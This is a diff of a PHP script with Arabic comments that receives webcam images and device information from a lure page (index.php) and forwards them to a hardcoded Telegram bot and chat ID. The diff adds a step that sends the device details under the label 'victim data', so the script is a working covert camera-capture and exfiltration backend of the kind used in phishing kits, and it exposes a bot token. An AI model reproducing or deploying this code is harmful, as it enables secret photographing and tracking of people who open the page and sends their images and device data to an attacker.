@@ -3,28 +3,36 @@
 $botToken = "8771622459:AAHTQLVU5fSRbP_gTZ4nFkqSKw2vyyHSlgM";
 $chatId = "8504751121";
 
-// استقبال البيانات (نستقبل المتغير img الذي يرسله index2.html)
+// 1. استقبال البيانات المرسلة من index.php
 $imageData = isset($_POST['img']) ? $_POST['img'] : null;
+$infoData = isset($_POST['info']) ? $_POST['info'] : "لا توجد معلومات إضافية";
 
+// 2. إذا توفرت معلومات الجهاز، نقوم بإرسالها كنص أولاً
+if (!empty($infoData)) {
+    $textUrl = "https://api.telegram.org/bot" . $botToken . "/sendMessage?chat_id=" . $chatId . "&text=" . urlencode("بيانات الضحية:\n" . $infoData);
+    file_get_contents($textUrl);
+}
+
+// 3. معالجة وإرسال الصورة
 if (!empty($imageData)) {
-    // 1. تنظيف البيانات وفك التشفير
+    // تنظيف البيانات وفك التشفير
     $filteredData = substr($imageData, strpos($imageData, ",")+1);
     $unencodedData = base64_decode($filteredData);
     
-    // 2. إنشاء ملف مؤقت باسم فريد (لضمان عدم تداخل الصور عند الإرسال السريع)
+    // إنشاء ملف مؤقت باسم فريد
     $tempFileName = 'cam_' . time() . '_' . rand(1000,9999) . '.png';
     file_put_contents($tempFileName, $unencodedData);
 
-    // 3. رابط الإرسال إلى تلجرام
+    // رابط الإرسال إلى تلجرام
     $url = "https://api.telegram.org/bot" . $botToken . "/sendPhoto";
 
-    // 4. إعداد البيانات للإرسال
+    // إعداد البيانات للإرسال
     $postFields = [
         'chat_id' => $chatId,
         'photo' => new CURLFile(realpath($tempFileName))
     ];
 
-    // 5. عملية الإرسال باستخدام CURL
+    // عملية الإرسال باستخدام CURL
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL, $url);
     curl_setopt($ch, CURLOPT_POST, 1);
@@ -33,7 +41,7 @@ if (!empty($imageData)) {
     curl_exec($ch);
     curl_close($ch);
 
-    // 6. الحذف الآمن للملف المؤقت بعد الإرسال
+    // الحذف الآمن للملف المؤقت بعد الإرسال
     if (file_exists($tempFileName)) {
         unlink($tempFileName);
     }
